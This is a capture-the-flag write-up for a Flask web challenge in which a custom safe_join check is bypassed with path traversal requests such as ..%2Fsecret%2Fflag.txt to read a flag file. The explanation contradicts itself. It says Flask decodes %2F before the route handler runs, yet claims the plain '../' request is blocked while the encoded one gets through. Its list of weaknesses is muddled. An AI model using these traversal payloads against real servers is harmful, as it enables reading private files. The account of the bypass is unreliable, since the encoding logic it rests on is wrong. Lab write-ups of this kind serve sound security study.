# Bookmarklet — Writeup  
**Category:** Web Exploitation  
**Difficulty:** Easy  

---

## Step 1 — Understanding the Challenge

The homepage contains a button that triggers a **bookmarklet**, which prompts the user for a filename and then loads:
<img width="1816" height="777" alt="image" src="https://github.com/user-attachments/assets/76bd020d-73a5-428a-9b3b-0f66a151d896" />
/page?name=<encoded_filename>


The bookmarklet uses:

```javascript
encodeURIComponent(n)
```
<br>

So entering:
```
../flag.txt

```
is sent as:
```
..%2Fflag.txt

```
Flask automatically decodes this back to:
```
../flag.txt

```
This behavior is essential for the exploit.
---
## Step 2 — Backend Behavior

The /page route:
```
@app.route("/page")
def page():
    name = request.args.get("name", "about.txt")
    file_path = safe_join(PAGES_DIR, name)
    if not file_path or not os.path.exists(file_path):
        return abort(404)
    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()
    return render_template("page.html", name=name, content=content)
```

The vulnerability lies in the custom safe_join():
```
def safe_join(base, user_path):
    if not user_path:
        return None
    if user_path.startswith("/") or user_path.startswith("\\"):
        return None
    normalized = os.path.normpath(os.path.join(base, user_path))
    if not normalized.startswith(os.path.abspath(base)):
        return None
    return normalized
```

### Weaknesses:

* Encoded traversal (`%2F`) becomes a slash `/` after Flask decodes input

* `os.path.normpath()` collapses traversal but does not stop escapes

* `startswith()` is a string comparison, not a secure path boundary check

* Mixed encodings and slashes bypass all checks

This allows directory traversal outside the `/pages` directory.

## Step 3 — Exploiting the Vulnerability

Direct traversal:

`/page?name=../flag.txt`


is blocked.

Encoded traversal succeeds:

/page?name=..%2Fflag.txt


If the flag is in a subfolder:

`/page?name=..%2Fsecret%2Fflag.txt`


Flask decodes this to:

`../secret/flag.txt`


`safe_join()` then normalizes it and mistakenly approves it.

## Step 4 — Retrieving the Flag


`http://localhost:5000/page?name=..%2Fsecret%2Fflag.txt
`

This escapes the /pages directory and returns the flag.
